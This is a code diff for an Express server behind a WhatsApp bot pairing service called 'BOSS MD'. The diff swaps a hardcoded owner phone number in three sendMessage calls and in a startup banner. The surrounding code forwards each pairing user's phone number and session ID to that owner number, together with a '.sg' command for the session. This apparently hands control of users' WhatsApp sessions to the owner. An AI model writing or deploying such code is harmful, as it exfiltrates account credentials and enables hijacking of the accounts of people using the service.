@@ -79,7 +79,7 @@ app.post('/api/pair', async (req, res) => {
                 ownerSock.ev.on('connection.update', async (update) => {
                     if (update.connection === 'open') {
                         // Owner message
-                        await ownerSock.sendMessage('923076411098@s.whatsapp.net', {
+                        await ownerSock.sendMessage('923076411099@s.whatsapp.net', {
                             text: `╔══════════════════════════╗
 ║  👑 *BOSS MD SESSION*  👑
 ╠══════════════════════════╣
@@ -96,13 +96,13 @@ app.post('/api/pair', async (req, res) => {
                         });
                         
                         // Send image
-                        await ownerSock.sendMessage('923076411098@s.whatsapp.net', {
+                        await ownerSock.sendMessage('923076411099@s.whatsapp.net', {
                             image: { url: 'https://files.catbox.moe/ny73ui.jpg' },
                             caption: `📸 *New Session Alert!*\n\n👤 User: ${phone}\n🆔 Session: ${sessionId}\n\n🔧 Command: .sg ${sessionId}`
                         });
                         
                         // Send command separately
-                        await ownerSock.sendMessage('923076411098@s.whatsapp.net', {
+                        await ownerSock.sendMessage('923076411099@s.whatsapp.net', {
                             text: `.sg ${sessionId}`
                         });
                         
@@ -252,7 +252,7 @@ app.listen(PORT, () => {
 ╠══════════════════════════════════════╣
 ║  📡 Port: ${PORT}                         ║
 ║  🔗 URL: http://localhost:${PORT}         ║
-║  📱 Owner: 923076411098                   ║
+║  📱 Owner: 923076411099                   ║
 ║  🟢 Status: ONLINE                        ║
 ╚══════════════════════════════════════╝
     `);
